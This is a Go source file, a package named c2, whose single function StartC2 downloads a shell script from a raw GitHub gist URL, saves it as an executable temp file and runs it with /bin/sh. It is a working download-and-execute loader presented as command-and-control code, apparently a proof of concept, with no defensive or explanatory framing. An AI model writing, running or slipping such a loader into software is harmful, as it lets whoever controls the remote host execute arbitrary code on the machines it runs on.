package c2

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

func StartC2() {
	url := "https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/75abf6e00ff9358ad6cc8eda67131b319259e86a/poc-test.txt"

	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	tmpFile, err := os.CreateTemp("", "script-*.sh")
	if err != nil {
		panic(err)
	}
	defer os.Remove(tmpFile.Name())
	io.Copy(tmpFile, resp.Body)
	tmpFile.Chmod(0755)
	tmpFile.Close()

	cmd := exec.Command("/bin/sh", tmpFile.Name())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		panic(err)
	}
}
